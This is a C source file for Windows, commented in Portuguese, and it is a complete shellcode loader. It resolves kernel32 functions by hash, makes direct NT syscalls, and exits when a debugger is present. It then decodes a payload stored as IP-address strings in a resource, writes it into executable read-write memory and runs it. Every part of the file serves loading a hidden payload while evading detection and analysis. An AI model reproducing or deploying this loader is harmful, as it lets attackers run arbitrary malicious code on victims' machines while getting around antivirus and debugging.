#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "resource.h"

// DIRECTS SYSCALLS
extern NTSTATUS NTAPI myNtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
extern NTSTATUS NTAPI myNtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);


// FUNCOES DA API 
typedef BOOL (WINAPI* PVirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef HANDLE (WINAPI* PGetCurrentProcess)();
typedef BOOL (WINAPI* PIsDebuggerPresent)();
typedef HRSRC (WINAPI* PFindResourceA)(HMODULE hModule, LPCSTR  lpName, LPCSTR lpType);
typedef HGLOBAL (WINAPI* PLoadResource)( HMODULE hModule, HRSRC hResInfo);
typedef LPVOID (WINAPI* PLockResource)(HGLOBAL hResData);

// HASH DAS FUNCOES DA API
unsigned int Freehash = 0xe8636251;
unsigned int GetCurrentProcessHash = 0xe1cb4a26;  
unsigned int IsDebugerPresentHash = 0x18232536;
unsigned int FindResourseHash = 0x7589c4c2;
unsigned int LoadResourseHash = 0xe1e07aa0;
unsigned int LockResourseHash = 0x4af25153;
unsigned int result;


// ALOCAR MEMORIA PARA OS PONTEIROS DAS FUNCOES
PVirtualFree pVirtualFree = NULL;
PGetCurrentProcess pGetCurrentProcess = NULL;
PIsDebuggerPresent pIsDebuggerPresent = NULL;
PFindResourceA pFindResourceA = NULL;
PLoadResource pLoadResource = NULL;
PLockResource pLockResource = NULL;


// FUNCAO PARA CONVERTER OS IPS EM BYTES NOVAMENTE
unsigned char* ConvertIpToBytes(const char* ipAddresses, size_t* byteArraySize) {
    size_t count = 0;
    for (const char* p = ipAddresses; *p; p++) {
        if (*p == '\n') count++;
    }

    PVOID byteArray = NULL;
    SIZE_T allocSize = count * 4;
    NTSTATUS status = myNtAllocateVirtualMemory(pGetCurrentProcess(), &byteArray, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status != 0 || byteArray == NULL) {
        return 0;
    }

    size_t index = 0;
    const char* current = ipAddresses;
    while (*current) {
        unsigned int b1, b2, b3, b4;
        if (sscanf(current, "%u.%u.%u.%u", &b1, &b2, &b3, &b4) != 4) {
            myNtAllocateVirtualMemory(pGetCurrentProcess(), &byteArray, 0, &allocSize, MEM_RELEASE, 0);
            return NULL;
        }
        ((unsigned char*)byteArray)[index++] = (unsigned char)b1;
        ((unsigned char*)byteArray)[index++] = (unsigned char)b2;
        ((unsigned char*)byteArray)[index++] = (unsigned char)b3;
        ((unsigned char*)byteArray)[index++] = (unsigned char)b4;

        // Move to the next line
        while (*current && *current != '\n') current++;
        if (*current == '\n') current++;
    }

    *byteArraySize = index;
    return (unsigned char*)byteArray;
}


// MAIN
int main() {

    // CARREGA A KERNEL32.DLL 
    HMODULE hModule = LoadLibraryA("kernel32.dll");
    if (!hModule) {
        return 0;
    }

    // ESTRUTURA DO PE (KERNEL32.DLL) PARA RESOLVER OS HASH E ACHAR AS FUNCOES NA DLL
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pImgDosHdr->e_lfanew);
    DWORD exportDirRVA = pImgNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY pExportHdr = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hModule + exportDirRVA);

    PDWORD addrFuncs = (PDWORD)((DWORD_PTR)hModule + pExportHdr->AddressOfFunctions);
    PDWORD addrNames = (PDWORD)((DWORD_PTR)hModule + pExportHdr->AddressOfNames);
    PWORD addrNameOrd = (PWORD)((DWORD_PTR)hModule + pExportHdr->AddressOfNameOrdinals);


    // ACHANDO AS FUNCOES ATRAVEZ DOS HASHES
    for (int i = 0; i < (int)pExportHdr->NumberOfNames; i++) {
        result = 0;
        char* name = (char*)((LPBYTE)hModule + addrNames[i]);
        while (*name) {
            result = *name ^ result;
            result *= 0x1000193;
            name++;
        }

        if (result == Freehash) {
            pVirtualFree = (PVirtualFree)((DWORD_PTR)hModule + addrFuncs[addrNameOrd[i]]);
        } else if (result == GetCurrentProcessHash) {
            pGetCurrentProcess = (PGetCurrentProcess)((DWORD_PTR)hModule + addrFuncs[addrNameOrd[i]]);
        } else if (result == IsDebugerPresentHash) {
            pIsDebuggerPresent = (PIsDebuggerPresent)((DWORD_PTR)hModule + addrFuncs[addrNameOrd[i]]);    
        } else if (result == FindResourseHash) {
            pFindResourceA = (PFindResourceA)((DWORD_PTR)hModule + addrFuncs[addrNameOrd[i]]);    
        } else if (result == LoadResourseHash) {
            pLoadResource = (PLoadResource)((DWORD_PTR)hModule + addrFuncs[addrNameOrd[i]]);    
        } else if (result == LockResourseHash) {
            pLockResource = (PLockResource)((DWORD_PTR)hModule + addrFuncs[addrNameOrd[i]]);    
        }

        if (pVirtualFree && pGetCurrentProcess && pIsDebuggerPresent && pFindResourceA && pLoadResource && pLockResource) {
            break;
        }
    }


    // COMECA O CODIGO MESMO 
    if (pIsDebuggerPresent()) {
        return 0;
    }

    HRSRC hRes = pFindResourceA(NULL, MAKEINTRESOURCE(MYIPS), MAKEINTRESOURCE(IPS));
    if (!hRes) {
        return 0;
    }

    HGLOBAL hLoadedRes = pLoadResource(NULL, hRes);
    if (!hLoadedRes) {
        return 0;
    }

    const char* ipAddresses = (const char*)pLockResource(hLoadedRes);
    if (!ipAddresses) {
        return 0;
    }

    size_t byteArraySize;
    unsigned char* byteArray = ConvertIpToBytes(ipAddresses, &byteArraySize);
    if (!byteArray) {
        return 0;
    }

    PVOID execAddress = NULL;
    SIZE_T execSize = byteArraySize;

    NTSTATUS status = myNtAllocateVirtualMemory(pGetCurrentProcess(), &execAddress, 0, &execSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status == 0 && execAddress != NULL) {
        SIZE_T bytesWritten;
        status = myNtWriteVirtualMemory(pGetCurrentProcess(), execAddress, byteArray, byteArraySize, &bytesWritten);
        if (status == 0) {
            ((void(*)())execAddress)();
        }

        pVirtualFree(execAddress, 0, MEM_RELEASE);
        free(byteArray);
    }

    return 0;
}
